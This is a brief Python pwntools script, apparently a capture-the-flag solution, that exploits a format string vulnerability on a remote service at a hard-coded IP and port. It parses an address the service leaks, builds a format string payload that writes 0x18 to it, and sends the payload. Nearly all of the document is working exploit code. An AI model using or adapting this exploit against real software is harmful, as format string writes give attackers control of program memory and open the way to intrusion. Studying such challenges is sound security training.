
"""
Basic format string vulenariblity

just insert 18 to the address they give to you!

"""

from pwn import *
r=remote('18.222.213.102',12345)

addr = r.recv(200)
addr = int(addr[30:40], 16)
payload =  repr(fmtstr_payload(6, {addr: 0x18}, write_size='int'))
payload = payload[1:-1]
r.sendline(payload)
print r.recv(400)
